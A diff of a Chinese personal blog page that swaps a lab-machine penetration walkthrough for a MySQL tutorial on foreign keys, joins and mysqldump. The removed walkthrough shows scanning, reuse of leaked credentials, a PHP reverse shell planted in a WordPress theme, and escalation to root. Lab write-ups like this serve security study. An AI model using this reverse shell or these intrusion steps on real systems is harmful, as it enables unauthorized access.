@@ -22,20 +22,23 @@
     var CONFIG = {"hostname":"atc96.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="Lazy靶机渗透 1. 渗透过程 2. 重要信息">
+  <meta name="description" content="[TOC] MySQL1. Mysql外键1. 外键设计 创建一个用户表 (被关联表) 12create table userinfo(uid int  primary key auto_increment not NULL,                       name varchar(20) not NULL , ...);  创建一个数据表 (关联表) 123456create ta">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Lazy 靶机渗透">
-<meta property="og:url" content="https://atc96.top/lazy/index.html">
+<meta property="og:title" content="mysql">
+<meta property="og:url" content="https://atc96.top/mysql/index.html">
 <meta property="og:site_name" content="Rex_Surprise">
-<meta property="og:description" content="Lazy靶机渗透 1. 渗透过程 2. 重要信息">
+<meta property="og:description" content="[TOC] MySQL1. Mysql外键1. 外键设计 创建一个用户表 (被关联表) 12create table userinfo(uid int  primary key auto_increment not NULL,                       name varchar(20) not NULL , ...);  创建一个数据表 (关联表) 123456create ta">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-05-09T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-05-10T11:10:42.920Z">
+<meta property="article:published_time" content="2020-05-10T11:25:15.565Z">
+<meta property="article:modified_time" content="2020-05-10T11:26:12.417Z">
 <meta property="article:author" content="Rex_Surprise">
-<meta property="article:tag" content="网络渗透">
+<meta property="article:tag" content="个人博客">
+<meta property="article:tag" content="博客">
+<meta property="article:tag" content="rex">
+<meta property="article:tag" content="RexSurprise">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://atc96.top/lazy/">
+<link rel="canonical" href="https://atc96.top/mysql/">
 
 
 <script id="page-configurations">
@@ -48,7 +51,7 @@
   };
 </script>
 
-  <title>Lazy 靶机渗透 | Rex_Surprise</title>
+  <title>mysql | Rex_Surprise</title>
   
 
 
@@ -201,7 +204,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://atc96.top/lazy/">
+    <link itemprop="mainEntityOfPage" href="https://atc96.top/mysql/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -214,7 +217,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Lazy 靶机渗透
+          mysql
         </h1>
 
         <div class="post-meta">
@@ -225,20 +228,11 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-05-10 00:00:00 / 修改时间：19:10:42" itemprop="dateCreated datePublished" datetime="2020-05-10T00:00:00+08:00">2020-05-10</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">靶机渗透</span></a>
-                </span>
+              <time title="创建时间：2020-05-10 19:25:15 / 修改时间：19:26:12" itemprop="dateCreated datePublished" datetime="2020-05-10T19:25:15+08:00">2020-05-10</time>
             </span>
 
           
-            <span id="/lazy/" class="post-meta-item leancloud_visitors" data-flag-title="Lazy 靶机渗透" title="阅读次数">
+            <span id="/mysql/" class="post-meta-item leancloud_visitors" data-flag-title="mysql" title="阅读次数">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -260,8 +254,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/lazy/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/lazy/" itemprop="commentCount"></span>
+    <a title="valine" href="/mysql/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/mysql/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -282,123 +276,56 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <!-- toc -->
+        <p>[TOC]</p>
+<h1><span id="mysql">MySQL</span></h1><h2><span id="1-mysql外键">1. Mysql外键</span></h2><h3><span id="1-外键设计">1. 外键设计</span></h3><ol>
+<li><p>创建一个用户表 (<strong>被关联表</strong>)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> userinfo(uid <span class="built_in">int</span>  primary <span class="keyword">key</span> auto_increment <span class="keyword">not</span> <span class="literal">NULL</span>, </span><br><span class="line">                      <span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">NULL</span> , ...);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建一个数据表 (<strong>关联表</strong>)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> userdata(did <span class="built_in">int</span> primary <span class="keyword">key</span> auto_increment <span class="keyword">not</span> <span class="literal">NULL</span>,</span><br><span class="line">                      <span class="keyword">data</span> <span class="built_in">text</span> ...,</span><br><span class="line">                      <span class="comment">--指定该表的某个字段与其他表为外键关系</span></span><br><span class="line">                      udid <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">NULL</span>,</span><br><span class="line">                      <span class="keyword">foreign</span> <span class="keyword">key</span>(udid) <span class="keyword">references</span> userinfo(uid));</span><br><span class="line">                      <span class="comment">--这样udid与 `userinfo` 表的uid构成外键关系</span></span><br></pre></td></tr></table></figure>
 
+</li>
+</ol>
+<h3><span id="2-数据操作">2. 数据操作</span></h3><ol>
+<li><p>插入数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> - 1.必须先插入被关联表(userinfo)的数据，再插入关联表(userdata)的数据。</span><br><span class="line"><span class="comment">-- userinfo 表插入数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> userinfo(uid,<span class="keyword">name</span>,...) <span class="keyword">values</span>(<span class="literal">NULL</span>,<span class="string">'root'</span>,...);</span><br><span class="line">...</span><br><span class="line"><span class="comment">-- userdata 表插入数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> userdata(did,<span class="keyword">data</span>,udid) <span class="keyword">values</span>(<span class="literal">NULL</span>,<span class="string">'data....'</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">--如果关联表(userdata)插入的uid在被关联表(userinfo)中不存在会报错</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<ol start="2">
+<li><p>更新数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> userdata <span class="keyword">set</span> udid=<span class="number">999</span> <span class="keyword">where</span> did=<span class="number">1</span>;</span><br><span class="line"><span class="comment">--需要注意的是当你设置的udid在userinfo表中找不到的时候会报错</span></span><br><span class="line"><span class="comment">--同时还要注意did的主键约束</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<ol start="3">
+<li><p>删除数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 要先删除已关联表字段(userdata)，才能修改被关联表(userinfo)中的关联uid字段。</span></span><br><span class="line"><span class="comment">-- 如果关联表(userinfo) uid 已经被关联了，那删除是就会报错</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<ol start="4">
+<li><p>高级查询</p>
 <ul>
-<li><a href="#lazy靶机渗透">Lazy靶机渗透</a><ul>
-<li><a href="#1-渗透过程">1. 渗透过程</a></li>
-<li><a href="#2-重要信息">2. 重要信息</a></li>
-</ul>
-</li>
-</ul>
-<!-- tocstop -->
+<li><p>内连接查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> userdata <span class="keyword">join</span> userinfo <span class="keyword">on</span> userdata.udid = userinfo.uid;</span><br><span class="line"><span class="comment">-- 结果会连在一起</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">-   外连接查询 (__分为左连接和右连接 __)</span><br><span class="line">    </span><br><span class="line">    ```sql</span><br><span class="line">    <span class="comment">-- 1.左连接</span></span><br><span class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> userdata <span class="keyword">left</span> <span class="keyword">join</span> userinfo <span class="keyword">on</span> userdata.udid = userinfo.uid;</span><br><span class="line">    <span class="comment">-- 2.右连接</span></span><br><span class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> userdata <span class="keyword">right</span> <span class="keyword">join</span> userinfo <span class="keyword">on</span> userdata.udid = userinfo.uid;</span><br><span class="line">    <span class="comment">-- 所谓左连接和右连接 无非是用哪个表做参考</span></span><br></pre></td></tr></table></figure>
 
-<a id="more"></a>
-<h1><span id="lazy靶机渗透">Lazy靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul>
-<li><p>话不多少说开始搜集信息：</p>
-</li>
-<li><p>这里使用 <code>netdiscover</code> : <code>netdiscover -i eth0 -r 192.168.0.0/24</code></p>
-</li>
-<li><p>发现一条</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.110   00:0c:29:b8:5f:5f      1      60  VMware, Inc.</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>使用nmap进一步探测端口 <code>nmap -sS 192.168.0.110 -oN /tmp/r.txt</code></p>
-</li>
-<li><p>扫描结果</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Host is up (0.00022s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">6667/tcp open  irc</span><br><span class="line">MAC Address: 00:0C:29:B8:5F:5F (VMware)</span><br><span class="line"><span class="comment">#后来用 nmap -v -A 192.168.0.110 扫面出</span></span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>80肯定是web，139和445都是Samba</p>
-</li>
-<li><p>我们先用nikto 扫面一下web，再试试Samba能不能连接</p>
-</li>
-<li><p><code>nikto -host http://192.168.0.110/ -o /tmp/r.html</code></p>
-</li>
-<li><p>我用kali里面的连接网络文件夹输入 <code>smb://192.168.0.110</code></p>
-</li>
-<li><p>发现有两个文件夹一个是 <code>$print</code> 另一个是 <code>$share</code> 发现第一个需要密码，第二个可以匿名访问</p>
-</li>
-<li><p>进去看看，都是一代码</p>
-</li>
-<li><p>还找到一个文件 <code>deets.txt</code> 内容是</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CBF Remembering all these passwords.</span><br><span class="line"></span><br><span class="line">Remember to remove this file and update your password after we push out the server.</span><br><span class="line"></span><br><span class="line">Password 12345</span><br><span class="line"></span><br><span class="line">CBF记住所有这些密码。</span><br><span class="line">请记住在我们推出服务器后删除此文件并更新您的密码。</span><br><span class="line">密码12345</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>发现一个服务器默认的密码 <code>12345</code></p>
-</li>
-<li><p>这时候我们在看nikto扫描的结果：</p>
-</li>
-<li><p>发现网站是<code>wordpress</code>框架，还有<code>phpmyadmin</code>的地址…</p>
-</li>
-<li><p>进到wordpress之后发现只有一篇文章，都是这句话<code>My name is togie.</code></p>
-</li>
-<li><p>这可能是某个用户名</p>
-</li>
-<li><p>这些相关的目录在<code>$share</code>都有那我们直接找<code>wordpress</code>的后台地址：<code>wp-admin</code></p>
-</li>
-<li><p>还在 <code>wp-config.php</code>找到了mysql的账号密码 <code>Admin ：TogieMYSQL12345^^</code></p>
-</li>
-<li><p>而且nikto还扫描到 <code>phpmyadmin</code>的地址，登进去看看，发现没有select权限，</p>
-</li>
-<li><p>那我们进去<code>wp-admin</code>看看也需要密码，咋办没密码呀，数据库也进不去，那就试试mysql的密码吧</p>
-</li>
-<li><p>发现mysql的密码竟然和 <code>wordpress</code>的账号密码是一样</p>
-</li>
-<li><p>进后台之后，查到可以修改主题的源代码，那我们就修改<code>404.php</code> 给了一个反弹shell的代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    $ip=<span class="string">'192.168.0.21'</span>;</span><br><span class="line">    $port=<span class="string">'20096'</span>;</span><br><span class="line">    $fp=@fsockopen($ip,$port,$errno,$errstr);</span><br><span class="line">    <span class="keyword">if</span>(!$fp)&#123; <span class="keyword">echo</span> <span class="string">"error"</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    	fputs($fp,<span class="string">"\nconnect success\n"</span>);</span><br><span class="line">    	<span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">    		fputs($fp,<span class="string">"shell:"</span>);</span><br><span class="line">    		$shell=fgets($fp);</span><br><span class="line">    		$message=`$shell`;</span><br><span class="line">    		fputs($fp,$message);</span><br><span class="line">    	&#125;</span><br><span class="line">    	fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后nc监听一下，激活主题并且访问一个不存在的帖子</p>
-</li>
-<li><p><code>http://192.168.0.110/wordpress/?p=-1</code></p>
-</li>
-<li><p>nc就弹回一个 <code>www-dada</code> 的shell</p>
-</li>
-<li><p>然后我们查看 <code>/etc/passwd</code>文件发现</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">togie:x:1000:1000:togie,,,:/home/togie:/bin/rbash</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>哈？这不就是之前说的那个可能的用户名嘛</p>
-</li>
-<li><p>然后服务器默认的密码 <code>12345</code>，那我们试试ssh能不能给他连上了</p>
-</li>
-<li><p>kali输入命令 ： <code>ssh togie@192.168.0.110</code>给我来一一段这样的话？</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#############################################################################</span></span><br><span class="line"><span class="comment">#              			Welcome to Web_TR1                                  #</span></span><br><span class="line"><span class="comment">#            All connections are monitored and recorded                     #    </span></span><br><span class="line"><span class="comment">#          Disconnect IMMEDIATELY if you are not an authorized user!        #     </span></span><br><span class="line"><span class="comment">#############################################################################</span></span><br><span class="line">togie@192.168.0.110<span class="string">'s password:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. 欢迎使用Web目录1</span></span><br><span class="line"><span class="string">2. 所有连接都被监视和记录</span></span><br><span class="line"><span class="string">3. 如果您不是授权用户，请立即断开连接！</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>哈？ 吓我呢？</p>
-</li>
-<li><p>试试密码，进去了，哈哈哈~</p>
-</li>
-<li><p>走一下三部曲</p>
-</li>
-<li><p><code>ls -al ~/</code></p>
-</li>
-<li><p>发现没啥</p>
-</li>
-<li><p><code>crontab -l</code></p>
-</li>
-<li><p>也没啥</p>
-</li>
-<li><p><code>history</code></p>
-</li>
-<li><p>也没啥~</p>
-</li>
-<li><p>然后我加一个第四部曲</p>
-</li>
-<li><p><code>sudo -l</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User togie may run the following commands on LazySysAdmin:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">用户togie可以在lazysadmin上运行以下命令：</span><br><span class="line">（全部：全部）全部</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>那还说什么 直接就是root权限了</p>
-</li>
-<li><p>直接 <code>sudo passwd root</code></p>
-</li>
-<li><p>root不就来了嘛</p>
-</li>
-<li><p>root用户下看到一个 <code>proof.txt</code></p>
-</li>
-<li><p>内容是：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Well done :)</span><br><span class="line"></span><br><span class="line">Hope you learn't a few things along the way.</span><br><span class="line"></span><br><span class="line">Regards,</span><br><span class="line"></span><br><span class="line">Togie Mcdogie</span><br><span class="line"></span><br><span class="line">Enjoy some random strings</span><br><span class="line"></span><br><span class="line">WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851</span><br><span class="line"><span class="meta">2d2v#</span><span class="bash">X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1<span class="variable">$#slTET7</span></span></span><br><span class="line"><span class="meta">pf%</span><span class="bash">&amp;1nRpaj^68ZeV2St9GkdoDkj48Fl<span class="variable">$MI97Zt2nebt02</span></span></span><br><span class="line">bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>WELL_DONE!!!</strong></p>
 </li>
 </ul>
-<h2><span id="2-重要信息">2. 重要信息</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. phpmyadmin地址</span></span><br><span class="line">http://192.168.0.110/phpmyadmin/</span><br><span class="line"><span class="comment"># 2. wordpress管理后台</span></span><br><span class="line">http://192.168.0.110/wordpress/wp-admin</span><br><span class="line"><span class="comment"># 3. mysql账号密码：</span></span><br><span class="line">Admin ：TogieMYSQL12345^^ （也是wordpress管理后台的账号密码）</span><br><span class="line"><span class="comment"># 4. ssh账号密码：</span></span><br><span class="line">togie ：12345</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-   联合查询</span><br><span class="line">```sql</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> userdata <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> userinfo</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-   子查询</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span><span class="keyword">sql</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> userdata) <span class="keyword">as</span> newName;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">DISTINCT</span>  * <span class="keyword">from</span> userdata <span class="keyword">where</span> udid <span class="keyword">in</span> (<span class="keyword">select</span> * <span class="keyword">from</span> userinfo);</span><br><span class="line"><span class="comment">-- DISTINCT表示去重的意思</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+
+
+<p>​    </p>
+<h2><span id="2-linux下mysql数据导入导出">2. Linux下Mysql数据导入导出</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">首先linux 下查看mysql相关目录</span><br><span class="line">root@ubuntu14:~# whereis mysql</span><br><span class="line">mysql:</span><br><span class="line">/usr/bin/mysql---- mysql的运行路径</span><br><span class="line">/etc/mysql</span><br><span class="line">/usr/lib/mysql----- mysql的安装路径</span><br><span class="line">/usr/bin/X11/mysql</span><br><span class="line">/usr/share/mysql</span><br><span class="line">/usr/share/man/man1/mysql.1.gz</span><br><span class="line">此外还有一个：</span><br><span class="line">var/lib/mysql --------mysql数据库data文件的存放路径</span><br><span class="line"></span><br><span class="line">确定了运行路径，执行导入、导出mysql数据库命令</span><br><span class="line">一、导出数据库用mysqldump命令</span><br><span class="line">（注意:先cd到mysql的运行路径下，再执行一下命令）：</span><br><span class="line">1、导出数据和表结构：</span><br><span class="line">mysqldump -u用户名 -p密码 数据库名 &gt; 数据库名.sql</span><br><span class="line">mysqldump -uroot -p dbname &gt; dbname .sql</span><br><span class="line">敲回车后会提示输入密码</span><br><span class="line">2、只导出表结构</span><br><span class="line">mysqldump -u用户名 -p密码 -d 数据库名 &gt; 数据库名.sql</span><br><span class="line">mysqldump -uroot -p -d dbname &gt; dbname .sql</span><br><span class="line"></span><br><span class="line">二、导入数据库</span><br><span class="line">1、首先建空数据库</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash">create database dbname ;</span></span><br><span class="line">2、导入数据库</span><br><span class="line">方法一：</span><br><span class="line">（1）选择数据库</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash">use dbname ;</span></span><br><span class="line">（2）设置数据库编码</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"><span class="built_in">set</span> names utf8;</span></span><br><span class="line">（3）导入数据（注意sql文件的路径）</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"><span class="built_in">source</span> /home/xxxx/dbname .sql;</span></span><br><span class="line">方法二：</span><br><span class="line">mysql -u用户名 -p密码 数据库名 &lt; 数据库名.sql</span><br></pre></td></tr></table></figure>
 
 
     </div>
@@ -408,9 +335,6 @@
     
 
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 网络渗透</a>
-          </div>
 
         
 
@@ -418,12 +342,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/DC-9/" rel="prev" title="DC-9 靶机渗透">
-      <i class="fa fa-chevron-left"></i> DC-9 靶机渗透
+    <a href="/DC-1/" rel="prev" title="DC-1 靶机渗透">
+      <i class="fa fa-chevron-left"></i> DC-1 靶机渗透
     </a></div>
       <div class="post-nav-item">
-    <a href="/india/" rel="next" title="india 靶机渗透">
-      india 靶机渗透 <i class="fa fa-chevron-right"></i>
+    <a href="/phpCode/" rel="next" title="phpCode">
+      phpCode <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -484,7 +408,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-text">Lazy靶机渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">1. 渗透过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">2. 重要信息</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-text">MySQL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">1. Mysql外键</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-text">1. 外键设计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-text">2. 数据操作</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">2. Linux下Mysql数据导入导出</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
